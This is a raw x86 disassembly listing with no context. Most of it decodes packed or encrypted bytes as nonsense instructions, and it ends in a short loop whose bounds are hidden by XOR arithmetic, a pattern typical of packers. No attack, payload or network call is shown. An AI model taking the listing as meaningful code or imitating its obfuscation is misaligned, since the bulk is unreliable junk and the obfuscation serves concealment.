  41cc13:	mov    ch,0xb7
  41cc15:	mov    ch,0xf6
  41cc17:	cli    
  41cc18:	xlat   BYTE PTR ds:[ebx]
  41cc19:	enter  0xf8fb,0xfe
  41cc1d:	neg    bl
  41cc1f:	out    dx,al
  41cc20:	add    al,BYTE PTR [edx]
  41cc22:	cmc    
  41cc23:	or     edx,esp
  41cc25:	aam    0xcb
  41cc27:	hlt    
  41cc28:	loop   0x41cbf6
  41cc2a:	jmp    0xc5de:0xe7c5edf3
  41cc31:	out    0xb4,eax
  41cc33:	int    0xe0
  41cc35:	(bad)  
  41cc37:	jmp    0x41cc35
  41cc39:	(bad)  
  41cc3a:	fcmovbe st,st(5)
  41cc3c:	div    bh
  41cc3e:	mov    edi,0xd5ebdef4
  41cc43:	idiv   edi
  41cc45:	ffreep st(7)
  41cc47:	(bad)  
  41cc49:	retf   0x4d9
  41cc4c:	ret    
  41cc4d:	into   
  41cc4e:	retf   
  41cc4f:	repnz (bad) 
  41cc51:	jecxz  0x41cc47
  41cc53:	repz (bad) [esi-0x406332a]
  41cc5a:	(bad)  
  41cc5c:	(bad)  
  41cc5d:	mov    ebp,0xdfd8e0fe
  41cc62:	ret    0xdd
  41cc65:	out    0x8,al
  41cc67:	ffree  st(7)
  41cc69:	add    esi,ebx
  41cc6b:	cli    
  41cc6c:	fsub   st(7),st
  41cc6e:	lds    edi,FWORD PTR [esi+ecx*8-0x52e2449]
  41cc75:	(bad)  
  41cc76:	inc    ch
  41cc78:	mov    esi,0xf9d1dfb9
  41cc7d:	in     al,dx
  41cc7e:	mov    edi,0xd8ebd2f1
  41cc83:	pop    es
  41cc84:	out    0xd7,al
  41cc86:	std    
  41cc87:	iret   
  41cc88:	fmul   DWORD PTR [eax]
  41cc8a:	add    cl,BYTE PTR [ebx]
  41cc8c:	mov    esi,0xd5dec5a6
  41cc91:	shl    DWORD PTR [ebx-0x52c1540],1
  41cc97:	icebp  
  41cc98:	std    
  41cc99:	fsubr  st,st(5)
  41cc9b:	mov    esi,0xe6e7bef3
  41cca0:	(bad)  
  41cca3:	(bad)  
  41cca5:	(bad)  
  41cca7:	aam    0xe4
  41cca9:	fucom  st(2)
  41ccab:	out    dx,al
  41ccac:	scas   al,BYTE PTR es:[edi]
  41ccad:	out    dx,al
  41ccae:	ret    
  41ccaf:	scas   eax,DWORD PTR es:[edi]
  41ccb0:	out    dx,eax
  41ccb1:	in     al,0xf6
  41ccb3:	mov    dl,0xcf
  41ccb5:	dec    ebp
  41ccb7:	in     eax,dx
  41ccb8:	mov    esi,0xe9b8ffdd
  41ccbd:	lock ret 
  41ccbf:	out    0xe3,eax
  41ccc1:	(bad)
  41ccc4:	or     bl,ch
  41ccc6:	bswap  ecx
  41ccc8:	ret    
  41ccc9:	call   0xec1fb79c
  41ccce:	lods   eax,DWORD PTR ds:[esi]
  41cccf:	int3   
  41ccd0:	out    dx,eax
  41ccd1:	loope  0x41ccc5
  41ccd3:	loope  0x41cc8f
  41ccd5:	fcmovb st,st(7)
  41ccd7:	jmp    0xd000:0xcfcfeddd
  41ccde:	shl    ch,1
  41cce0:	(bad)  
  41cce1:	not    ebp
  41cce3:	loop   0x41ccb6
  41cce5:	call   0xf00cc2c7
  41ccea:	cli    
  41cceb:	jmp    0xb4d2:0xb0c0d2ee
  41ccf2:	xlat   BYTE PTR ds:[ebx]
  41ccf3:	ret    0xb0d5
  41ccf6:	in     al,dx
  41ccf7:	out    dx,eax
  41ccf8:	div    bh
  41ccfa:	jecxz  0x41ccb0
  41ccfc:	lock ret 0xe1d0
  41cd00:	not    esp
  41cd02:	repz not cl
  41cd05:	fninit 
  41cd07:	(bad)  
  41cd08:	out    dx,eax
  41cd09:	sti    
  41cd0a:	cld    
  41cd0b:	dec    eax
  41cd0d:	test   eax,0xb4e4e8c9
  41cd12:	call   0xc933bcf1
  41cd17:	repz jmp 0xeffe:0xbafacffd
  41cd1f:	test   DWORD PTR ds:0xdcf7e6d1,0xc8f40be1
  41cd29:	fsub   st(4),st
  41cd2b:	cli    
  41cd2c:	fcomip st,st(7)
  41cd2e:	loope  0x41cce0
  41cd30:	out    dx,eax
  41cd31:	out    dx,al
  41cd32:	mov    ch,0xb1
  41cd34:	call   0xec387dfd
  41cd39:	hlt    
  41cd3a:	mov    ebp,0xc3c0e0fe
  41cd3f:	mul    edx
  41cd41:	pop    es
  41cd42:	mov    ebp,0xd5dd090b
  41cd47:	loope  0x41cd3e
  41cd49:	jmp    0x41cd13
  41cd4b:	out    dx,eax
  41cd4c:	repnz in al,0xa8
  41cd4f:	ror    dh,1
  41cd51:	sar    BYTE PTR [ebx-0x4493f10],cl
  41cd57:	out    dx,eax
  41cd58:	mov    ebx,0x1e9fdd1
  41cd5d:	clc    
  41cd5e:	loopne 0x41cd41
  41cd60:	frstpm(287 only) 
  41cd62:	hlt    
  41cd63:	cli    
  41cd64:	sti    
  41cd65:	add    ah,dh
  41cd67:	push   es
  41cd68:	or     cl,BYTE PTR [ebx]
  41cd6a:	psllw  mm4,mm2
  41cd6d:	mov    ebp,0xfbe0dedc
  41cd72:	(bad)  
  41cd73:	icebp  
  41cd74:	jmp    0xccbc:0xd9e8efff
  41cd7b:	mov    esp,0xd803cfdc
  41cd80:	out    0xe5,al
  41cd82:	loop   0x41cd69
  41cd84:	rol    dh,1
  41cd86:	loopne 0x41cd87
  41cd88:	or     ah,al
  41cd8a:	fimul  WORD PTR [ebx]
  41cd8c:	lods   eax,DWORD PTR ds:[esi]
  41cd8d:	retf   
  41cd8e:	mov    bl,0xb3
  41cd90:	scas   eax,DWORD PTR es:[edi]
  41cd91:	aam    0xcb
  41cd93:	xlat   BYTE PTR ds:[ebx]
  41cd94:	mov    cl,0xcf
  41cd96:	in     al,0xcd
  41cd98:	jmp    0x41cd9d
  41cd9a:	(bad)  
  41cd9c:	call   ebx
  41cd9e:	add    esi,ecx
  41cda0:	hlt    
  41cda1:	clc    
  41cda2:	repz aad 0xfb
  41cda5:	shl    ch,0xd6
  41cda8:	add    edx,ebx
  41cdaa:	ficom  WORD PTR [ebx]
  41cdac:	call   0xb7ffb689
  41cdb1:	jmp    0xacfb:0xb9cbc6c2
  41cdb8:	mov    dh,0xf2
  41cdba:	out    dx,al
  41cdbb:	int    0xce
  41cdbd:	add    ecx,esp
  41cdbf:	rol    BYTE PTR [edi],cl
  41cdc1:	cmc    
  41cdc2:	shl    al,cl
  41cdc4:	or     dh,ah
  41cdc6:	or     al,BYTE PTR [ebx]
  41cdc8:	retf   0xee3
  41cdcb:	jmp    0x41cd7c
  41cdcd:	rcl    bh,0xc2
  41cdd0:	loop   0x41cd9f
  41cdd2:	idiv   edx
  41cdd4:	int3   
  41cdd5:	in     eax,0xf8
  41cdd7:	out    dx,al
  41cdd8:	aad    0xcf
  41cdda:	(bad)  
  41cddc:	(bad)  
  41cdde:	icebp  
  41cddf:	rcr    ch,1
  41cde1:	shl    ecx,0xd0
  41cde4:	test   esp,0xfafde9e7
  41cdea:	iret   
  41cdeb:	retf   0xaed2
  41cdee:	mov    esi,0xe9f2f2ce
  41cdf3:	loop   0x41cdc5
  41cdf5:	fnstenv [edi-0xe14210d]
  41cdfb:	mov    ebx,0x1f4f4bf
  41ce00:	pop    es
  41ce01:	shl    cl,cl
  41ce03:	test   cl,0xc7
  41ce06:	pop    es
  41ce07:	cli    
  41ce08:	or     esp,edx
  41ce0a:	add    ebp,ebp
  41ce0c:	ror    dh,cl
  41ce0e:	rcl    cl,cl
  41ce10:	mov    al,0xb6
  41ce12:	(bad)  
  41ce13:	jmp    0x41cde4
  41ce15:	repz mov eax,0xb5d8f5c6
  41ce1b:	repnz rcr esi,1
  41ce1e:	int3   
  41ce1f:	loop   0x41cded
  41ce21:	mov    esp,0x7e70606
  41ce26:	ror    BYTE PTR [edx],0xc7
  41ce29:	in     al,dx
  41ce2a:	jmp    0xc3f17a0b
  41ce2f:	mov    cl,0xbc
  41ce31:	leave  
  41ce32:	cli    
  41ce33:	out    0xd2,al
  41ce35:	repz (bad) 
  41ce38:	lock cmc 
  41ce3a:	clc    
  41ce3b:	sar    BYTE PTR [ebx-0x1b38232e],1
  41ce41:	(bad)  
  41ce42:	aam    0xea
  41ce44:	add    DWORD PTR [eax],ecx
  41ce46:	idiv   ebx
  41ce48:	fisttp WORD PTR [ecx]
  41ce4a:	fsubr  st(7),st
  41ce4c:	fsubr  st(2),st
  41ce4e:	jecxz  0x41ce41
  41ce50:	scas   al,BYTE PTR es:[edi]
  41ce51:	jmp    0xeb36be1a
  41ce56:	fsubr  DWORD PTR [edi+ecx*8+0x1babbc9]
  41ce5d:	rcr    esp,cl
  41ce5f:	add    edi,ebx
  41ce61:	fcmovne st,st(3)
  41ce63:	loope  0x41ce4d
  41ce65:	shr    dl,1
  41ce67:	out    0xd5,eax
  41ce69:	fucomi st,st(3)
  41ce6b:	(bad)  
  41ce6d:	ffree  st(5)
  41ce6f:	jmp    0xb8b9:0xd3cbd0ee
  41ce76:	(bad)  
  41ce77:	jmp    0xf702:0xffebf1ec
  41ce7e:	(bad)  
  41ce80:	repnz fcomip st,st(4)
  41ce83:	(bad)  
  41ce84:	xlat   BYTE PTR ds:[ebx]
  41ce85:	out    0xfb,eax
  41ce87:	cli    
  41ce88:	cli    
  41ce89:	in     eax,0xe3
  41ce8b:	add    eax,0xe5e4eced
  41ce90:	mov    esp,0xd1e4c8ac
  41ce95:	leave  
  41ce96:	out    dx,eax
  41ce97:	mov    esi,0xbcb1b4dd
  41ce9c:	mov    esi,0xfabdd3ee
  41cea1:	add    edx,esp
  41cea3:	stc    
  41cea4:	cmc    
  41cea5:	add    eax,0xf9e3d6ca
  41ceaa:	add    dl,ch
  41ceac:	lods   eax,DWORD PTR ds:[esi]
  41cead:	mov    dl,0xa5
  41ceaf:	mov    bl,0xcb
  41ceb1:	mov    dh,0xce
  41ceb3:	mov    dh,0xf7
  41ceb5:	fmul   st,st(3)
  41ceb7:	mov    ah,0xd7
  41ceb9:	int3   
  41ceba:	(bad)  
  41cebb:	add    cl,dh
  41cebd:	fsubrp st(0),st
  41cebf:	add    esp,ebx
  41cec1:	loopne 0x41cec1
  41cec3:	retf   
  41cec4:	(bad)  
  41cec6:	jmp    0xc207:0xdce0e4d5
  41cecd:	shr    ecx,1
  41cecf:	lds    edi,FWORD PTR [esi+ebp*8-0xf101840]
  41ced6:	mov    edx,0xfbb2cede
  41cedb:	mov    ebp,0xe2fd07f5
  41cee0:	add    eax,0xd0f1f3fe
  41cee5:	fcmovbe st,st(7)
  41cee7:	aam    0xcb
  41cee9:	retf   0xe4e3
  41ceec:	mov    esp,0xefb1add2
  41cef1:	jmp    0xce189ee2
  41cef6:	fcomip st,st(5)
  41cef8:	fyl2xp1 
  41cefa:	fucomip st,st(7)
  41cefc:	mov    edi,0xbc0303d9
  41cf01:	jecxz  0x41cef4
  41cf03:	(bad)  
  41cf04:	jecxz  0x41cedf
  41cf06:	add    cl,BYTE PTR [ebx]
  41cf08:	or     bl,dl
  41cf0a:	add    ah,cl
  41cf0c:	mov    esp,0xbdefd3ef
  41cf11:	lods   al,BYTE PTR ds:[esi]
  41cf12:	out    0xb2,al
  41cf14:	(bad)
  41cf17:	(bad)  
  41cf18:	cmc    
  41cf19:	retf   
  41cf1a:	cmc    
  41cf1b:	retf   0x7e9
  41cf1e:	cld    
  41cf1f:	icebp  
  41cf20:	icebp  
  41cf21:	div    eax
  41cf23:	cld    
  41cf24:	shl    ch,1
  41cf26:	fcomip st,st(6)
  41cf28:	pop    es
  41cf29:	(bad)  
  41cf2a:	fsub   st,st(4)
  41cf2c:	out    dx,al
  41cf2d:	les    ebp,FWORD PTR [ebp+ebp*8-0x4b244d20]
  41cf34:	stc    
  41cf35:	mov    al,0xef
  41cf37:	aad    0xce
  41cf39:	hlt    
  41cf3a:	iret   
  41cf3b:	add    bh,bh
  41cf3d:	fdivr  st,st(0)
  41cf3f:	fyl2xp1 
  41cf41:	pop    es
  41cf42:	mov    ebp,0xe206f5f8
  41cf47:	or     ah,dl
  41cf49:	loop   0x41cf10
  41cf4b:	jecxz  0x41cf0b
  41cf4d:	shl    edx,cl
  41cf4f:	in     al,0xc5
  41cf51:	leave  
  41cf52:	repz mul dh
  41cf55:	icebp  
  41cf56:	jmp    0xf8db:0xcdf1fbdd
  41cf5d:	enter  0xd0bc,0xfc
  41cf61:	out    0xc3,eax
  41cf63:	ret    0xc6cb
  41cf66:	or     bh,cl
  41cf68:	or     cl,BYTE PTR ds:0xf0a907e2
  41cf6e:	loope  0x41cf21
  41cf70:	out    0xec,al
  41cf72:	cmc    
  41cf73:	(bad)  
  41cf74:	out    0xae,al
  41cf76:	out    dx,eax
  41cf77:	dec    bl
  41cf79:	fcom   st(5)
  41cf7b:	mov    esp,0xfa00fefc
  41cf80:	shl    eax,1
  41cf82:	aad    0x6
  41cf84:	out    0xef,eax
  41cf86:	cld    
  41cf87:	(bad)
  41cf8a:	jmp    0xe3f5a279
  41cf8f:	mov    bl,0xae
  41cf91:	mov    ah,0xb0
  41cf93:	lock loopne 0x41cf47
  41cf96:	mov    edx,0xc8edf9d7
  41cf9b:	div    ebx
  41cf9d:	mov    esp,0xf0f5e0d9
  41cfa2:	jecxz  0x41cf65
  41cfa4:	(bad)  
  41cfa5:	loope  0x41cf6d
  41cfa7:	out    0xe4,eax
  41cfa9:	fcmovu st,st(2)
  41cfab:	jmp    0xe5bd:0xe9adc3ce
  41cfb2:	jmp    0xdfd0:0xd4dff2ce
  41cfb9:	icebp  
  41cfba:	mov    esi,0xf1bf02
  41cfbf:	mov    ebp,0xe700f0da
  41cfc4:	out    0xd9,eax
  41cfc6:	out    dx,al
  41cfc7:	jecxz  0x41cfaa
  41cfc9:	std    
  41cfca:	fdiv   st(5),st
  41cfcc:	fdiv   QWORD PTR [ebx-0x2e1e2319]
  41cfd2:	shl    eax,1
  41cfd4:	out    0xed,eax
  41cfd6:	mov    edi,0xb9e9d3df
  41cfdb:	repz leave 
  41cfdd:	in     eax,dx
  41cfde:	loop   0x41cfb2
  41cfe0:	in     al,0xfd
  41cfe2:	jmp    0x41cfca
  41cfe4:	call   0xe29adde
  41cfe9:	hlt    
  41cfea:	or     eax,0xdcf3afe6
  41cfef:	out    0xe2,eax
  41cff1:	cmc    
  41cff2:	leave  
  41cff3:	mov    edx,0xbfcad1b3
  41cff8:	call   0xbc1fd2da
  41cffd:	rol    DWORD PTR [ebx],1
  41cfff:	ret    
  41d000:	loope  0x41cfce
  41d002:	rol    DWORD PTR [ebx+ebp*8],1
  41d005:	clc    
  41d006:	or     ebp,ecx
  41d008:	out    dx,al
  41d009:	(bad)
  41d00c:	in     eax,0xac
  41d00e:	ffree  st(6)
  41d010:	out    0xdc,eax
  41d012:	mov    bl,0xb1
  41d014:	cmc    
  41d015:	mov    eax,0xccdeccb9
  41d01a:	fnsave [eax+0x7f6f5fc]
  41d020:	push   es
  41d021:	hlt    
  41d022:	mov    esp,0xc6fef4c0
  41d027:	psubusw mm0,mm5
  41d02a:	jmp    0xc9bd:0xc4a8bffa
  41d031:	mov    bh,0xc7
  41d033:	rcl    edx,cl
  41d035:	jmp    0xd6d1:0x3d4eed8
  41d03c:	add    dh,cl
  41d03e:	add    ah,ch
  41d040:	sar    ah,cl
  41d042:	pop    es
  41d043:	loopne 0x41d048
  41d045:	add    esi,esi
  41d047:	loopne 0x41d012
  41d049:	repz add al,BYTE PTR [edi]
  41d04c:	out    0xce,eax
  41d04e:	mov    al,0xf2
  41d050:	mov    cl,0xb6
  41d052:	mov    bh,0xd7
  41d054:	mov    ecx,0xcfffe9ec
  41d059:	ror    bh,1
  41d05b:	mov    esi,0xc6f6f5fc
  41d060:	(bad)  
  41d061:	jmp    0x41d042
  41d063:	in     al,0xe6
  41d065:	jmp    0x41d068
  41d067:	fcmovu st,st(6)
  41d069:	in     al,dx
  41d06a:	or     bh,bh
  41d06c:	shr    dh,1
  41d06e:	int3   
  41d06f:	repnz icebp 
  41d071:	scas   al,BYTE PTR es:[edi]
  41d072:	out    0xf1,eax
  41d074:	(bad)  
  41d076:	rcl    edx,1
  41d078:	jmp    0x41d068
  41d07a:	jmp    0xcf16b158
  41d07f:	(bad)  
  41d080:	out    0xd7,al
  41d082:	lock mov eax,0xd6d4bee3
  41d088:	aam    0xe4
  41d08a:	pop    es
  41d08b:	or     ch,bh
  41d08d:	jmp    0xc835a454
  41d092:	in     al,0xcb
  41d094:	rcl    bh,1
  41d096:	stc    
  41d097:	call   eax
  41d099:	sar    DWORD PTR [ecx+ebp*8-0x21094611],cl
  41d0a0:	pop    es
  41d0a1:	fucom  st(6)
  41d0a3:	loop   0x41d089
  41d0a5:	loope  0x41d083
  41d0a7:	cld    
  41d0a8:	in     al,0x5
  41d0aa:	(bad)  
  41d0ab:	inc    bl
  41d0ad:	fsubr  st,st(2)
  41d0af:	jmp    0x41d07d
  41d0b1:	out    dx,al
  41d0b2:	lods   al,BYTE PTR ds:[esi]
  41d0b3:	out    0xf3,al
  41d0b5:	aad    0xb8
  41d0b7:	jmp    0xf800:0xeebfbadf
  41d0be:	faddp  st(3),st
  41d0c0:	div    ah
  41d0c2:	loop   0x41d0be
  41d0c4:	lds    ecx,FWORD PTR [ecx]
  41d0c6:	loope  0x41d097
  41d0c8:	or     al,0x5
  41d0ca:	fild   DWORD PTR ds:0xf0b7aeea
  41d0d0:	loop   0x41d0c7
  41d0d2:	loope  0x41d0cf
  41d0d4:	leave  
  41d0d5:	idiv   dl
  41d0d7:	int    0xf0
  41d0d9:	fstp   st(2)
  41d0db:	out    dx,al
  41d0dc:	lock iret 
  41d0de:	rcl    dl,1
  41d0e0:	aad    0xd8
  41d0e2:	jecxz  0x41d0e5
  41d0e4:	shr    edx,1
  41d0e6:	add    eax,0x13f8daee
  41d0eb:	iret   
  41d0ec:	lods   eax,DWORD PTR ds:[esi]
  41d0ed:	jmp    0xcad3:0xf1b6ace8
  41d0f4:	(bad)
  41d0f7:	repz cli 
  41d0f9:	into   
  41d0fa:	(bad)  
  41d0fb:	ror    ecx,cl
  41d0fd:	rcl    bl,1
  41d0ff:	(bad)  
  41d100:	rol    edx,0xc6
  41d103:	shl    bh,1
  41d105:	leave  
  41d106:	iret   
  41d107:	add    al,bl
  41d109:	into   
  41d10a:	add    esi,ebx
  41d10c:	mov    esp,0xcdd2adf7
  41d111:	not    eax
  41d113:	repnz ror dh,0xe4
  41d117:	fucomp st(4)
  41d119:	std    
  41d11a:	mov    cl,0xf9
  41d11c:	repnz out dx,eax
  41d11e:	add    bh,BYTE PTR [eax-0x291e012a]
  41d124:	loop   0x41d111
  41d126:	jecxz  0x41d0f7
  41d128:	cli    
  41d129:	out    dx,eax
  41d12a:	out    0xe0,eax
  41d12c:	ror    ecx,1
  41d12e:	(bad)  
  41d130:	in     al,0xae
  41d132:	leave  
  41d133:	rol    ebp,cl
  41d135:	mov    al,0xcb
  41d137:	aad    0xed
  41d139:	mov    ecx,0xdfe0eaf9
  41d13e:	rol    DWORD PTR [esi],cl
  41d140:	fdiv   st,st(5)
  41d142:	push   es
  41d143:	add    al,0xc2
  41d145:	enter  0xc0ef,0xec
  41d149:	or     eax,0xd3ccc4ea
  41d14e:	enter  0xe0e1,0xcc
  41d152:	jecxz  0x41d0fc
  41d154:	mov    bl,0xcc
  41d156:	idiv   eax
  41d158:	fmul   st(6),st
  41d15a:	jecxz  0x41d125
  41d15c:	fcomip st,st(7)
  41d15e:	iret   
  41d15f:	rcr    eax,cl
  41d161:	sti    
  41d162:	fstp   st(1)
  41d164:	in     al,0xdd
  41d166:	add    al,0xc6
  41d168:	inc    dl
  41d16a:	sar    edx,0xbf
  41d16d:	loop   0x41d120
  41d16f:	mov    esp,0xf4d3b6ee
  41d174:	mov    ebx,0xeef2b9da
  41d179:	mov    ah,0xcd
  41d17b:	int    0xd8
  41d17d:	add    bl,al
  41d17f:	lock frndint 
  41d182:	mov    ecx,0xefe7c0cb
  41d187:	or     bl,ah
  41d189:	(bad)  
  41d18b:	rol    bh,0xcf
  41d18e:	mov    dl,0xc6
  41d190:	jmp    0xeef2c865
  41d195:	shl    ecx,1
  41d197:	(bad)  
  41d199:	out    dx,al
  41d19a:	(bad)  
  41d19b:	shr    ah,cl
  41d19d:	mul    eax
  41d19f:	stc    
  41d1a0:	add    esp,esi
  41d1a2:	aad    0xc4
  41d1a4:	cld    
  41d1a5:	push   es
  41d1a6:	iret   
  41d1a7:	call   0x823a6a5
  41d1ac:	(bad)  
  41d1ad:	jmp    0xcfca:0xb3b3dcd0
  41d1b4:	int    0xb1
  41d1b6:	xlat   BYTE PTR ds:[ebx]
  41d1b7:	mov    edi,0xbac3f8ef
  41d1bc:	(bad)  
  41d1bd:	mov    ecx,0xd4e6f1b5
  41d1c2:	lock mov esp,0x70fcbf9
  41d1c8:	stc    
  41d1c9:	or     DWORD PTR [esi],eax
  41d1cb:	in     al,dx
  41d1cc:	jmp    0xf7ed:0xd1f5f2e3
  41d1d3:	mov    ch,0xec
  41d1d5:	sti    
  41d1d6:	mov    edx,0xbef1bdd2
  41d1db:	into   
  41d1dc:	sti    
  41d1dd:	xlat   BYTE PTR ds:[ebx]
  41d1de:	test   dh,0xd0
  41d1e1:	int3   
  41d1e2:	fcomp  st(5)
  41d1e4:	push   es
  41d1e5:	aad    0xfc
  41d1e7:	aam    0x1
  41d1e9:	jecxz  0x41d1da
  41d1eb:	shl    ebp,cl
  41d1ed:	jecxz  0x41d1d7
  41d1ef:	int    0xbc
  41d1f1:	jmp    0x41d1a4
  41d1f3:	call   0xb9358cf0
  41d1f8:	stc    
  41d1f9:	jmp    0x41d1f2
  41d1fb:	fstp   TBYTE PTR [ebp-0xe011d12]
  41d201:	shl    edi,0xc0
  41d204:	shl    eax,0xcf
  41d207:	inc    DWORD PTR [edi]
  41d209:	inc    ecx
  41d20b:	std    
  41d20c:	ret    
  41d20d:	fadd   st,st(4)
  41d20f:	mov    ebp,0xf1bbecae
  41d214:	aad    0xf1
  41d216:	repz (bad) 
  41d219:	fdivr  st,st(0)
  41d21b:	sar    dh,1
  41d21d:	loope  0x41d217
  41d21f:	repnz cmc 
  41d221:	add    ebx,ebx
  41d223:	(bad)  
  41d224:	push   es
  41d225:	out    dx,eax
  41d226:	loop   0x41d228
  41d228:	add    bh,cl
  41d22a:	ror    DWORD PTR [edi],cl
  41d22c:	out    dx,al
  41d22d:	(bad)  
  41d22e:	out    0xe6,al
  41d230:	shr    dh,0xac
  41d233:	mov    bl,0xe0
  41d235:	(bad)  
  41d236:	idiv   BYTE PTR [ebx-0x32202714]
  41d23c:	add    dh,bh
  41d23e:	mov    ch,0xf1
  41d240:	int3   
  41d241:	shl    dh,0xf8
  41d244:	ret    
  41d245:	add    al,cl
  41d247:	jmp    0x140fb75a
  41d24c:	in     eax,0xe9
  41d24e:	mov    esp,0xd5aacdf3
  41d253:	shl    ch,1
  41d255:	repnz jmp 0xd0bf:0xcefdc9b4
  41d25d:	add    ebp,ebx
  41d25f:	lock out 0xeb,eax
  41d262:	(bad)  
  41d264:	aam    0xd6
  41d266:	fcmovne st,st(2)
  41d268:	fcmovne st,st(2)
  41d26a:	push   cs
  41d26b:	shr    ecx,cl
  41d26d:	ror    edi,cl
  41d26f:	icebp  
  41d270:	lods   eax,DWORD PTR ds:[esi]
  41d271:	not    ah
  41d273:	in     eax,0xea
  41d275:	icebp  
  41d276:	(bad)
  41d279:	repnz in al,dx
  41d27b:	jecxz  0x41d23b
  41d27d:	mov    eax,0xe7c5fff1
  41d282:	add    al,0xd2
  41d284:	stc    
  41d285:	mov    esi,0xecc6030e
  41d28a:	add    ecx,DWORD PTR ds:0xd5bec3f1
  41d290:	jmp    0x41d25c
  41d292:	lock retf 0xfacd
  41d296:	icebp  
  41d297:	mov    al,0xf9
  41d299:	mov    eax,0xdae3d7ce
  41d29e:	shl    dl,cl
  41d2a0:	(bad)  
  41d2a1:	in     al,dx
  41d2a2:	shl    ah,cl
  41d2a4:	add    eax,DWORD PTR [edx]
  41d2a6:	(bad)  
  41d2a7:	iret   
  41d2a8:	(bad)  
  41d2aa:	adc    edi,esp
  41d2ac:	mov    esi,0xc8ddd1a6
  41d2b1:	xlat   BYTE PTR ds:[ebx]
  41d2b2:	out    0xf5,eax
  41d2b4:	in     eax,0xef
  41d2b6:	in     al,dx
  41d2b7:	retf   
  41d2b8:	int3   
  41d2b9:	ror    edx,cl
  41d2bb:	lock aam 0xf9
  41d2be:	repz int 0xf1
  41d2c1:	ror    DWORD PTR [ebx],1
  41d2c3:	icebp  
  41d2c4:	add    ah,ch
  41d2c6:	stc    
  41d2c7:	aad    0x7
  41d2c9:	inc    BYTE PTR [ebx]
  41d2cb:	fucomip st,st(1)
  41d2cd:	mov    bl,0xe4
  41d2cf:	jmp    0xe7b2:0xd2b5c0f0
  41d2d6:	jmp    0xd5d2:0xedeafed1
  41d2dd:	in     eax,dx
  41d2de:	(bad)  
  41d2df:	(bad)  
  41d2e1:	fld    DWORD PTR [edx]
  41d2e3:	jmp    0x41d2a5
  41d2e5:	mov    esi,0xdcfaeed4
  41d2ea:	fndisi(8087 only) 
  41d2ec:	jmp    0xf0ec:0xafccadc1
  41d2f3:	mov    dh,0xf0
  41d2f5:	mov    al,0xed
  41d2f7:	lock aam 0xf8
  41d2fa:	idiv   BYTE PTR [eax-0x332a2d29]
  41d300:	icebp  
  41d301:	ret    
  41d302:	repnz retf 0xdffb
  41d306:	(bad)  
  41d307:	aam    0xde
  41d309:	in     al,dx
  41d30a:	in     al,0x8
  41d30c:	mov    edi,0xc7dca5e9
  41d311:	lods   eax,DWORD PTR ds:[esi]
  41d312:	out    dx,eax
  41d313:	shl    ch,0xcd
  41d316:	int    0xf1
  41d318:	mov    eax,0xf6b9deb9
  41d31d:	std    
  41d31e:	loop   0x41d322
  41d320:	xlat   BYTE PTR ds:[ebx]
  41d321:	loopne 0x41d32e
  41d323:	ret    0xff09
  41d326:	or     ebx,esi
  41d328:	push   cs
  41d329:	(bad)  
  41d32a:	sti    
  41d32b:	fdiv   QWORD PTR [ebx-0x424f4214]
  41d331:	mov    cl,0xac
  41d333:	mov    dl,0xf6
  41d335:	aam    0xba
  41d337:	mov    dh,0xde
  41d339:	retf   0xf5d2
  41d33c:	mov    eax,0xe4cdc103
  41d341:	mov    ebp,0xe808eae7
  41d346:	(bad)  
  41d347:	out    0xfe,al
  41d349:	retf   
  41d34a:	stc    
  41d34b:	add    al,0xab
  41d34d:	iret   
  41d34e:	out    0xde,al
  41d350:	lods   al,BYTE PTR ds:[esi]
  41d351:	xlat   BYTE PTR ds:[ebx]
  41d352:	repnz lods al,BYTE PTR ds:[esi]
  41d354:	into   
  41d355:	(bad)  
  41d356:	aam    0xfa
  41d358:	rol    esp,cl
  41d35a:	int3   
  41d35b:	faddp  st(2),st
  41d35d:	in     al,dx
  41d35e:	repz ret 
  41d360:	in     eax,0x7
  41d362:	cld    
  41d363:	test   BYTE PTR ds:0xcafcd5cb,0xda
  41d36a:	leave  
  41d36b:	jmp    0x41d34f
  41d36d:	mov    ebp,0xe1ccbee0
  41d372:	jmp    0xc6f6846b
  41d377:	out    0xb6,al
  41d379:	cld    
  41d37a:	leave  
  41d37b:	into   
  41d37c:	fcomp  st(6)
  41d37e:	(bad)  
  41d37f:	icebp  
  41d380:	cld    
  41d381:	stc    
  41d382:	rol    DWORD PTR [ebx],0xe3
  41d385:	aam    0xcb
  41d387:	sti    
  41d388:	or     cl,BYTE PTR [edi]
  41d38a:	ud2    
  41d38c:	retf   
  41d38d:	(bad)  
  41d38f:	in     eax,dx
  41d390:	mov    ch,0xcd
  41d392:	lock shl DWORD PTR [edx-0xe2f3419],0xb8
  41d39a:	add    edi,esi
  41d39c:	cli    
  41d39d:	dec    bh
  41d39f:	test   DWORD PTR [edi],0xfbf5e1ff
  41d3a5:	jmp    0x41d3a9
  41d3a7:	retf   
  41d3a8:	cmc    
  41d3a9:	retf   0xe4c1
  41d3ac:	(bad)  
  41d3ae:	test   eax,0xcdd4dcc2
  41d3b3:	repz mov al,0xb2
  41d3b6:	out    dx,eax
  41d3b7:	retf   
  41d3b8:	repnz in al,0xff
  41d3bb:	jecxz  0x41d3bc
  41d3bd:	mov    edi,0xc0e70307
  41d3c2:	add    bh,dl
  41d3c4:	aad    0xef
  41d3c6:	fucomi st,st(0)
  41d3c8:	enter  0x8d9,0xd8
  41d3cc:	mov    ebp,0xcdb7f2e2
  41d3d1:	loope  0x41d3c6
  41d3d3:	in     eax,dx
  41d3d4:	call   0xe620a3a3
  41d3d9:	fdivrp st(4),st
  41d3db:	(bad)  [edi-0x7e064305]
  41d3e1:	sar    ebx,0x72
  41d3e4:	xor    al,BYTE PTR [eax]
  41d3e6:	sub    eax,ecx
  41d3e8:	cmp    edx,eax
  41d3ea:	jne    0x421c8b
  41d3f0:	mov    eax,DWORD PTR [ebp-0x8]
  41d3f3:	add    eax,DWORD PTR [ebp-0x10c]
  41d3f9:	mov    al,BYTE PTR [eax]
  41d3fb:	mov    BYTE PTR [ebp-0x131],al
  41d401:	mov    eax,DWORD PTR [ebp-0x118]
  41d407:	xor    eax,0x75108b5
  41d40c:	add    eax,0x3272fb
  41d411:	mov    DWORD PTR [ebp-0x138],eax
  41d417:	jmp    0x41d429
  41d41c:	mov    eax,DWORD PTR [ebp-0x138]
  41d422:	inc    eax
  41d423:	mov    DWORD PTR [ebp-0x138],eax
  41d429:	mov    eax,DWORD PTR [ebp-0x114]
  41d42f:	xor    eax,0x75108b5
  41d434:	add    eax,0x3272fb
  41d439:	cmp    DWORD PTR [ebp-0x138],eax
  41d43f:	jmp    0x41f7e5
  41d444:	xor    BYTE PTR [eax-0xf141525],0x90
  41d44b:	lock inc ecx
